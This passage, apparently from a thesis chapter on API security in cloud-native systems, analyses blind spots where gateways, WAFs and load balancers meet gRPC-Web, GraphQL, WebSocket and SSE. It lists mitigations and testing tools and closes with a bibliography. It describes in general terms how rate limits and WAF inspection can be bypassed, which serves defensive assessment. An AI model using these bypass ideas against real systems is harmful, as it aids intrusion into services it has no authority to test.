attack), the WAF does not detect it because it does not understand protobuf semantics.

```
[WAF]
  Inspects: application/grpc-web+proto (base64 text)
  Validates: "base64 format OK ✓"

[Backend]
  Receives: binary gRPC protobuf
  Deserialises: malicious payload → RCE
```

Payload validation can **differ** between the WAF (HTTP layer) and the backend (gRPC layer), creating an exploitable
gap.

---

## 10. SSE + load balancer: silent connection timeout

### 10.1 The violated assumption

A load balancer assumes that HTTP connections are **short-lived** (seconds, minutes at most). A configured timeout
(default 30-60 seconds) closes idle connections.

SSE needs a **long-lived HTTP connection** (hours, days) to stream events.

### 10.2 The operational blind spot

AWS Application Load Balancer: default idle timeout **60 seconds**.

If an SSE connection is idle for more than 60 s (no event sent), the ALB closes it.

The problem:

```
T=0: [The client establishes an SSE connection with a JWT (expiry: 1h)]
    ↓
[The server streams events]
T=30min: data: {"event": "update"}
T=31min: data: {"event": "notification"}
    ↓ (Events stop - no new data)
T=32min: connection idle
    ...
T=32min+60s: [The ALB closes the connection for idle timeout]
    ↓
[The EventSource API reconnects automatically]
    ↓ (Tries to reconnect with the JWT)
T=1h+1s: the JWT has expired
    ↓ (Reconnection fails - 401 Unauthorized)
[The client loses the events of the disconnect window]
```

### 10.3 Workaround: heartbeat events

The server sends a **heartbeat** (comment line) more often than every 60 s to keep the connection alive:

```
data: {"event": "update"}

: heartbeat

data: {"event": "notification"}

: heartbeat
```

Comment lines (prefixed with `:`) are ignored by the `EventSource` API, but keep the connection active.

Source: Treblle, How SSE and STDIO can ruin your API security, https://treblle.com/blog/sse-stdio-api-security

The blind spot: the load balancer **does not distinguish** heartbeats from real traffic. Heartbeats consume:

- bandwidth (small but continuous);
- connection slots (one persistent connection per client);
- server resources (periodic heartbeat generation).

---

## Summary of part 2: a taxonomy of blind spots

### Recurring failure patterns

Analysing the ten problematic interactions, **five recurring failure patterns** emerge:

**Pattern 1, state mismatch**: the architecture assumes stateless, the protocol needs state.

- Examples: WebSocket + API gateway, SSE + load balancer.
- Root cause: infrastructure designed for request/response, not persistent connections.

**Pattern 2, protocol translation loss**: transcoding introduces metadata loss or semantic mismatch.

- Examples: gRPC-Web → gRPC, Istio protocol downgrade HTTP/2 → HTTP/1.1.
- Root cause: information lost in the conversion between protocols.

**Pattern 3, payload opacity**: the infrastructure cannot inspect binary or encrypted payloads.

- Examples: gRPC protobuf, WebSocket frames after the upgrade.
- Root cause: WAF/IDS blind to non-text formats.

**Pattern 4, semantic routing failure**: the infrastructure routes on HTTP metadata, the protocol routes on payload
semantics.

- Examples: GraphQL batching, a single endpoint with many operations.
- Root cause: the gateway does not understand the application semantics.

**Pattern 5, resource accounting mismatch**: the infrastructure measures HTTP requests, the protocol runs N operations
per request.

- Examples: GraphQL batching, gRPC streaming, WebSocket frames.
- Root cause: units of measure misaligned between layers.

### Blind spot matrix by architecture and protocol

| Protocol | Architecture | Primary blind spot | Technical cause | Mitigation |
|---|---|---|---|---|
| gRPC | Service mesh sidecar | Memory exhaustion | Envoy buffers infinite streams | Ambient mode / memory limits |
| gRPC | Istio gateway | Protocol downgrade | HTTP/1.1 fallback not logged | Explicit annotations |
| GraphQL | API gateway | Batching rate limit bypass | 1 HTTP request = N queries | Query complexity analysis |
| GraphQL | API gateway | Introspection leakage | Field suggestions in errors | Disable field hints (difficult) |
| WebSocket | API gateway | Rate limiting after the handshake | Frames not counted as HTTP | Application-level limiter |
| WebSocket | API gateway | WAF bypass | Frames not inspectable | Application-level validation |
| WebSocket | AWS API Gateway | Private network impossible | Always a regional endpoint | Workaround: ELB + ECS |
| WebSocket | API gateway | Logging truncation | 1024 bytes max per log event | Application-level logging |
| gRPC-Web | Envoy transcoding | Metadata loss | Logs HTTP, processes gRPC | End-to-end log correlation |
| SSE | Load balancer | Connection timeout | Idle timeout closes long-lived connections | Heartbeat events |

---

## Implications for the testing framework

### Emerging design principles

The analysis of the pathologies shows that an effective security testing framework must:

**Principle 1, test interactions, not isolated components.** Do not test "GraphQL" separately from "API gateway".
Test "GraphQL through an API gateway with rate limiting configured", verifying the actual enforcement of batching
limits.

**Principle 2, do not assume configuration = enforcement.** Introspection disabled ≠ secret schema (field suggestion
bypass). Rate limiting configured ≠ protection (WebSocket/GraphQL bypass). WAF enabled ≠ payload inspection (opaque
WebSocket frames). Runtime verification is needed, not only a configuration audit.

**Principle 3, protocol-aware tool selection.** Traditional tools (Burp, ZAP) cover REST adequately. GraphQL needs
`graphql-cop`, `clairvoyance`, a query complexity calculator. gRPC needs `grpcurl`, a protobuf decoder, a reflection
probe. WebSocket needs a stateful client, an Origin validation tester, a frame fuzzer. SSE needs a long-duration
connection manager and a heartbeat detector.

**Principle 4, multi-layer validation.** A single layer is not enough:

- gateway layer: authentication, basic rate limiting;
- service mesh layer: mTLS, network policy;
- application layer: field-level authorization, input validation.

The framework must test policy enforcement at every layer, and identify the gaps where one layer assumes another
handles security (but it does not).

### Tool gaps identified

Generic HTTP scanners (Nikto, Dirb, OWASP ZAP baseline) **do not cover**:

- WebSocket frame analysis after the handshake;
- gRPC protobuf decoding without the `.proto` file;
- GraphQL query complexity calculation;
- long SSE connections with token expiry;
- protocol downgrade detection (HTTP/2 → HTTP/1.1).

The framework needs to orchestrate specialised tools:

- `grpcurl`, `ghz` for gRPC;
- `graphql-cop`, `clairvoyance` for GraphQL;
- `wscat`, `wsdump.py` for WebSocket;
- a custom EventSource client for SSE;
- `tcpdump` + analysis for protocol inspection.

---

## Conclusions of phase 1.C

The analysis of architecture-protocol interactions has shown that complexity does not come from the single components
but from their combinations. A secure API gateway + secure GraphQL do not guarantee a secure system if the gateway
counts HTTP requests while GraphQL runs batched queries. A service mesh with mTLS + encrypted gRPC do not guarantee
protection if memory exhaustion crashes the sidecar.

The blind spots identified are not implementation-specific bugs but **emergent properties** of the impedance mismatch
between architectural designs. WebSocket is intrinsically stateful, an API gateway is intrinsically stateless-oriented.
This fundamental incompatibility creates structural blind spots (rate limiting bypass, WAF bypass, logging truncation)
that cannot be solved by simple configuration.

The distinction between physiology (how integrations should work) and pathology (where they fail) shows that
architectural best practices have **intrinsic limitations**. Standard configurations do not remove blind spots, they
only partly mitigate them. Security testing must therefore:

1. recognise which architecture-protocol combination is deployed;
2. identify the blind spots specific to that combination;
3. test actual enforcement, not declared configuration;
4. use protocol-specific tools, not generic scanners.

This deep understanding of the interactions gives the basis needed to design a security assessment framework that
works effectively in real cloud-native environments, where the attack surface is defined not by the single components
but by their complex interactions.

---

## Technical bibliography (phase 1.C)

### gRPC + Kubernetes/Service Mesh

- Datadog - gRPC at Datadog: https://www.datadoghq.com/blog/grpc-at-datadog/
- AWS Prescriptive Guidance - gRPC on Amazon EKS with ALB: https://docs.aws.amazon.com/prescriptive-guidance/latest/patterns/deploy-a-grpc-based-application-on-an-amazon-eks-cluster-and-access-it-with-an-application-load-balancer.html
- Kubernetes Ingress-Nginx - gRPC Example: https://kubernetes.github.io/ingress-nginx/examples/grpc/
- Medium - Don't Load Balance gRPC Using Kubernetes Service: https://medium.com/@lapwingcloud/dont-load-balance-grpc-or-http2-using-kubernetes-service-ae71be026d7f
- Istio - gRPC Proxyless Service Mesh: https://istio.io/latest/blog/2021/proxyless-grpc/
- GitHub - Istio Discussion #53877: https://github.com/istio/istio/discussions/53877
- Red Hat - gRPC Protocol Listener on Service Mesh: https://access.redhat.com/solutions/6246351
- VMware Blog - gRPC-Web and Istio: https://blogs.vmware.com/networkvirtualization/2019/04/grpc-web-and-istio.html/

### GraphQL + API Gateway

- Escape Tech - How to Secure GraphQL APIs: https://escape.tech/blog/how-to-secure-graphql-apis/
- Apollo GraphQL - Introduction to Apollo Federation: https://www.apollographql.com/docs/federation
- Contentful - Understanding Federated GraphQL: https://www.contentful.com/blog/understanding-federated-graphql/
- GraphQL API Gateway Guide - Federation Pattern: https://graphql-api-gateway.com/graphql-api-gateway-patterns/graphql-federation
- Cyber Chief - Mastering GraphQL Introspection: https://www.cyberchief.ai/2024/11/graphql-security.html

### WebSocket + API Gateway

- AWS API Gateway - Protect WebSocket APIs: https://docs.aws.amazon.com/apigateway/latest/developerguide/websocket-api-protect.html
- AWS API Gateway - Important Notes: https://docs.aws.amazon.com/apigateway/latest/developerguide/api-gateway-known-issues.html
- AWS re:Post - WebSocket API Gateway Security: https://repost.aws/questions/QUV184Gf_kSHqrFNWOJswD0g/websocket-api-gateway-security-or-alternatives-for-streaming
- Microsoft Learn - Import WebSocket API to Azure API Management: https://learn.microsoft.com/en-us/azure/api-management/websocket-api
- Microsoft Learn - WebSocket Support in Azure Application Gateway: https://learn.microsoft.com/en-us/azure/application-gateway/application-gateway-websocket
- Modus Create - Building WebSocket Server with AWS API Gateway: https://www.moduscreate.com/blog/building-a-websocket-server-using-aws-api-gateway
- Medium - AWS API Gateway Deep Dive (WebSocket API): https://medium.com/@joudwawad/aws-api-gateway-deep-dive-websocket-api-a00558fa40e1

### Server-Sent Events

- Treblle - How SSE and STDIO Can Ruin Your API Security: https://treblle.com/blog/sse-stdio-api-security

### Serverless & General

- Serverless Architecture Patterns: https://americanchase.com/serverless-architecture-patterns/
- Lumigo - AWS Lambda Architecture: https://lumigo.io/learn/aws-lambda-architecture/
- Azure Architecture Center - API Gateways: https://learn.microsoft.com/en-us/azure/architecture/microservices/design/gateway
- Kong Gateway Documentation: https://developer.konghq.com/gateway/

## Technical bibliography (phase 1.C, extended list)

### gRPC + Kubernetes

- Datadog - gRPC at Datadog: [https://www.datadoghq.com/blog/grpc-at-datadog/](https://www.datadoghq.com/blog/grpc-at-datadog/)
- AWS Prescriptive Guidance - gRPC on Amazon EKS with ALB: [https://docs.aws.amazon.com/prescriptive-guidance/latest/patterns/deploy-a-grpc-based-application-on-an-amazon-eks-cluster-and-access-it-with-an-application-load-balancer.html](https://docs.aws.amazon.com/prescriptive-guidance/latest/patterns/deploy-a-grpc-based-application-on-an-amazon-eks-cluster-and-access-it-with-an-application-load-balancer.html)
- Kubernetes Ingress-Nginx - gRPC Example: [https://kubernetes.github.io/ingress-nginx/examples/grpc/](https://kubernetes.github.io/ingress-nginx/examples/grpc/)
- Kubernetes Gateway API - gRPC Routing: [https://gateway-api.sigs.k8s.io/guides/grpc-routing/](https://gateway-api.sigs.k8s.io/guides/grpc-routing/)
- Medium - Don't Load Balance gRPC Using Kubernetes Service: [https://medium.com/@lapwingcloud/dont-load-balance-grpc-or-http2-using-kubernetes-service-ae71be026d7f](https://medium.com/@lapwingcloud/dont-load-balance-grpc-or-http2-using-kubernetes-service-ae71be026d7f)
- OneUptime - gRPC Kubernetes Deployment: [https://oneuptime.com/blog/post/2026-01-08-grpc-kubernetes-deployment/view](https://oneuptime.com/blog/post/2026-01-08-grpc-kubernetes-deployment/view)

### gRPC + Service Mesh

- Istio - gRPC Proxyless Service Mesh: [https://istio.io/latest/blog/2021/proxyless-grpc/](https://istio.io/latest/blog/2021/proxyless-grpc/)
- GitHub - Istio Discussion #53877: [https://github.com/istio/istio/discussions/53877](https://github.com/istio/istio/discussions/53877)
- Red Hat - gRPC Protocol Listener on Service Mesh: [https://access.redhat.com/solutions/6246351](https://access.redhat.com/solutions/6246351)
- VMware Blog - gRPC-Web and Istio: [https://blogs.vmware.com/networkvirtualization/2019/04/grpc-web-and-istio.html/](https://blogs.vmware.com/networkvirtualization/2019/04/grpc-web-and-istio.html/)

### GraphQL + API Gateway

- Escape Tech - How to Secure GraphQL APIs: [https://escape.tech/blog/how-to-secure-graphql-apis/](https://escape.tech/blog/how-to-secure-graphql-apis/)
- Apollo GraphQL - Introduction to Apollo Federation: [https://www.apollographql.com/docs/federation](https://www.apollographql.com/docs/federation)
- GraphQL.org - GraphQL Federation: [https://graphql.org/learn/federation/](https://graphql.org/learn/federation/)
- Contentful - Understanding Federated GraphQL: [https://www.contentful.com/blog/understanding-federated-graphql/](https://www.contentful.com/blog/understanding-federated-graphql/)
- GraphQL API Gateway Guide - Federation Pattern: [https://graphql-api-gateway.com/graphql-api-gateway-patterns/graphql-federation](https://graphql-api-gateway.com/graphql-api-gateway-patterns/graphql-federation)
- Cyber Chief - Mastering GraphQL Introspection: [https://www.cyberchief.ai/2024/11/graphql-security.html](https://www.cyberchief.ai/2024/11/graphql-security.html)

### WebSocket + API Gateway

- AWS API Gateway - Protect WebSocket APIs: [https://docs.aws.amazon.com/apigateway/latest/developerguide/websocket-api-protect.html](https://docs.aws.amazon.com/apigateway/latest/developerguide/websocket-api-protect.html)
- AWS API Gateway - Important Notes: [https://docs.aws.amazon.com/apigateway/latest/developerguide/api-gateway-known-issues.html](https://docs.aws.amazon.com/apigateway/latest/developerguide/api-gateway-known-issues.html)
- AWS API Gateway - Deploy WebSocket APIs: [https://docs.aws.amazon.com/apigateway/latest/developerguide/apigateway-set-up-websocket-deployment.html](https://docs.aws.amazon.com/apigateway/latest/developerguide/apigateway-set-up-websocket-deployment.html)
- AWS re:Post - WebSocket API Gateway Security: [https://repost.aws/questions/QUV184Gf_kSHqrFNWOJswD0g/websocket-api-gateway-security-or-alternatives-for-streaming](https://repost.aws/questions/QUV184Gf_kSHqrFNWOJswD0g/websocket-api-gateway-security-or-alternatives-for-streaming)
- Microsoft Learn - Expose WebSocket Server to Application Gateway: [https://learn.microsoft.com/en-us/azure/application-gateway/ingress-controller-expose-websocket-server](https://learn.microsoft.com/en-us/azure/application-gateway/ingress-controller-expose-websocket-server)
- Microsoft Learn - WebSocket Support in Azure Application Gateway: [https://learn.microsoft.com/en-us/azure/application-gateway/application-gateway-websocket](https://learn.microsoft.com/en-us/azure/application-gateway/application-gateway-websocket)
- Microsoft Learn - Import WebSocket API to Azure API Management: [https://learn.microsoft.com/en-us/azure/api-management/websocket-api](https://learn.microsoft.com/en-us/azure/api-management/websocket-api)
- Modus Create - Building WebSocket Server with AWS API Gateway: [https://www.moduscreate.com/blog/building-a-websocket-server-using-aws-api-gateway](https://www.moduscreate.com/blog/building-a-websocket-server-using-aws-api-gateway)
- Medium - AWS API Gateway Deep Dive (WebSocket API): [https://medium.com/@joudwawad/aws-api-gateway-deep-dive-websocket-api-a00558fa40e1](https://medium.com/@joudwawad/aws-api-gateway-deep-dive-websocket-api-a00558fa40e1)

### Server-Sent Events

- Treblle - How SSE and STDIO Can Ruin Your API Security: [https://treblle.com/blog/sse-stdio-api-security](https://treblle.com/blog/sse-stdio-api-security)

### Serverless Architectures

- Serverless Architecture Patterns: [https://americanchase.com/serverless-architecture-patterns/](https://americanchase.com/serverless-architecture-patterns/)
- Lumigo - AWS Lambda Architecture: [https://lumigo.io/learn/aws-lambda-architecture/](https://lumigo.io/learn/aws-lambda-architecture/)
- AWS Documentation - Amazon API Gateway: [https://docs.aws.amazon.com/apigateway/latest/developerguide/welcome.html](https://docs.aws.amazon.com/apigateway/latest/developerguide/welcome.html)

### General Resources

- Azure Architecture Center - API Gateways: [https://learn.microsoft.com/en-us/azure/architecture/microservices/design/gateway](https://learn.microsoft.com/en-us/azure/architecture/microservices/design/gateway)
- Kong Gateway Documentation: [https://developer.konghq.com/gateway/](https://developer.konghq.com/gateway/)

**End of phase 1.C: architecture-protocol interaction matrix**

---

**End of chapter 1, state of the art: architectures, protocols and interactions**

The chapter has given a complete technical basis to understand the modern landscape of APIs in cloud-native
environments, analysing separately the architectures (the container), the protocols (the content), and their
interactions (where the real complexity appears). This layered understanding is essential to design an effective
security assessment framework, the subject of the following phases of the thesis.
